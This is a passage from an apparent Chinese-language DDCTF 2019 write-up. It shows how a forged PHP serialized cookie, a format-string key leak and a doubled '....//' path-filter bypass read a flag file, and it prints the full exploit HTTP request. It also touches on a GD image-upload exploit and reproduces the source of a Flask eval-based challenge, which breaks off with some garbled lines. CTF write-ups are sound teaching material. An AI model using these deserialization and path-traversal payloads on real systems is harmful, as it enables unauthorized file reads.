            $cookiedata = serialize($userdata);
            $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
            $expire = $this->cookie_expiration + time();
            setcookie(
                $this->cookie_name,
                $cookiedata,
                $expire,
                $this->cookie_path,
                $this->cookie_domain,
                $this->cookie_secure
                );
        }
    }
    $ddctf = new Session();
    $ddctf->index();
首先留意到`class Application`中有一个读取文件的地方
    public function __destruct() {
            if(empty($this->path)) {
                exit();
            }else{
                $path = $this->sanitizepath($this->path);
                if(strlen($path) !== 18) {
                    exit();
                }
                $this->response($data=file_get_contents($path),'Congratulations');
            }
            exit();
    }
路径要求18位，而`../config/flag.txt`刚好18位满足要求，基本可以确定flag的位置，`sanitizepath`会将`../`替换为空，可直接双写绕过过滤`....//config/flag.txt`。
然后在`class Session`中`session_read()`有反序列化的代码，只要触发反序列化就能到读取文件的地方
    $session = $_COOKIE[$this->cookie_name];
            if(!isset($session)) {
                parent::response("session not found",'error');
                return FALSE;
            }
            $hash = substr($session,strlen($session)-32);
            $session = substr($session,0,strlen($session)-32);
            if($hash !== md5($this->eancrykey.$session)) {
                parent::response("the cookie data not match",'error');
                return FALSE;
            }
            $session = unserialize($session);
其中`cookie_name`为`ddctf_id`，代码会对session内容进行校验，校验方法为最后32位的hash值，要等于`md5($this->eancrykey.$session)`，绕过验证需要泄露`$this->eancrykey`的值
留意到`session_read()`中有一段格式化字符的代码
    if(!empty($_POST["nickname"])) {
                $arr = array($_POST["nickname"],$this->eancrykey);
                $data = "Welcome my friend %s";
                foreach ($arr as $k => $v) {
                    $data = sprintf($data,$v);
                }
                parent::response($data,"Welcome");
            }
这里for循环会对`$data`进行两次格式化字符串操作，其中`nickname`我们可控，若`nickname=%s`，第二次格式化字符串就能把`$this->eancrykey`泄露出来。
至此，伪造session的信息收集完毕，可以伪造session进行文件读取，代码如下。
将代码生成的payload URL编码后发送
    POST /app/Session.php HTTP/1.1
    didictf_username: admin
    cookie: ddctf_id=O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22....%2F%2Fconfig%2Fflag.txt%22%3B%7D77cd55a8d29df4f005f85e536d876525
发送后得到：  
`{"errMsg":"Congratulations","data":"DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}"}`
### Upload-IMG
    http://117.51.148.166/upload.php
    user：dd@ctf
    pass：DD@ctf#000
登录后直接上传一张图片，提示未包含`phpinfo()`
将图片下载下来，winhex打开看了一下，发现文件头有`gd-jpeg`
搜索一下发现GD库图片渲染存在漏洞，
`jpg_name.jpg`是待GD处理的图片
    php jpg_payload.php 
如提示缺少gd库，可用`apt install php-gd`安装
网上不少文章提到不一定每张图片都可以成功写入，需要多试几张，而我脸比较黑，试了十多张无果。
绝望之际，拿了群里大佬发的一个表情包，终于成功了，泪目。。。
### homebrew event loop
题目是一个flask站，并且提供了源码
    from flask import Flask, session, request, Response 
    import urllib 
    app = Flask(__name__) 
    app.secret_key = '*********************' # censored 
    url_prefix = '/d5afe1f66147e857' 
    def FLAG(): 
        return 'FLAG_is_here_but_i_wont_show_you'  # censored 
    def trigger_event(event): 
        session['log'].append(event) 
        if len(session['log']) > 5: session['log'] = session['log'][-5:] 
        if type(event) == type([]): 
            request.event_queue += event 
        else: 
            request.event_queue.append(event) 
    def get_mid_str(haystack, prefix, postfix=None): 
        haystack = haystack[haystack.find(prefix)+len(prefix):] 
        if postfix is not None: 
            haystack = haystack[:haystack.find(postfix)] 
        return haystack 
    class RollBackException: pass 
    def execute_event_loop(): 
        valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') 
        resp = None 
        while len(request.event_queue) > 0: 
            event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" 
            request.event_queue = request.event_queue[1:] 
            if not event.startswith(('action:', 'func:')): continue 
            for c in event: 
                if c not in valid_event_chars: break 
            else: 
                is_action = event[0] == 'a' 
                action = get_mid_str(event, ':', ';') 
                args = get_mid_str(event, action+';').split('#') 
                try: 
                    event_handler = eval(action + ('_handler' if is_action else '_function')) 
                    ret_val = event_handler(args) 
                except RollBackException: 
                    if resp is None: resp = '' 
                    resp += 'ERROR! All transactions have been cancelled. ' 
                    resp += 'Go back to index.html' 
                    session['num_items'] = request.prev_session['num_items'] 
                    session['points'] = request.prev_session['points'] 
                    break 
                except Exception, e: 
                    if resp is None: resp = '' 
                    #resp += str(e) # only for debugging 
                    continue 
                if ret_val is not None: 
                    if resp is None: resp = ret_val 
                    else: resp += ret_val 
        if resp is None or resp == '': resp = ('404 NOT FOUND', 404) 
        session.modified = True 
        return resp 
    @app.route(url_prefix+'/') 
    def entry_point(): 
        querystring = urllib.unquote(request.query_string) 
        request.event_queue = [] 
        if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100: 
            querystring = 'action:index;False#False' 
        if 'num_items' not in session: 
            session['num_items'] = 0 
            session['points'] = 3 
            session['log'] = [] 
        request.prev_session = dict(session) 
        trigger_event(querystring) 
        return execute_event_loop() 
    # handlers/functions below -------------------------------------- 
    def view_handler(args): 
        page = args[0] 
        html = '' 
        html += '[INFO] you have {} diamonds, {} points now.'.format(session['num_items'], session['points']) 
        if page == 'index': 
            html += 'View source code' 
            html += 'Go to e-shop' 
            html += 'Reset' 
        elif page == 'shop': 
            html += 'Buy a diamond (1 point)' 
        elif page == 'reset': 
            del session['num_items'] 
            html += 'Session reset.' 
        html += 'Go back to index.html' 
        return html 
    def index_handler(args): 
        bool_show_source = str(args[0]) 
        bool_download_source = str(args[1]) 
        if bool_show_source == 'True': 
            source = open('eventLoop.py', 'r') 
            html = '' 
            if bool_download_source != 'True': 
                html += 'Download this .py file' 
                html += 'Go back to index.html' 
            for line in source: 
                if bool_download_source != 'True': 
                    html += line.replace('&','&amp;').replace('\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('','&gt;').replace('\n', '') 
                else: 
                    html += line 
            source.close() 
            if bool_download_source == 'True': 
                headers = {} 
                headers['Content-Type'] = 'text/plain' 
                headers['Content-Disposition'] = 'attachment; filename=serve.py' 
                return Response(html, headers=headers) 
            else: 
                return html 
        else: 
            trigger_event('action:view;index') 
    def buy_handler(args): 
        num_items = int(args[0]) 
        if num_items '.format(args[0]) 
        session['num_items'] += num_items  
        trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index']) 
    def consume_point_function(args): 
        point_to_consume = int(args[0]) 
        if session['points'] ' 
    def get_flag_handler(args): 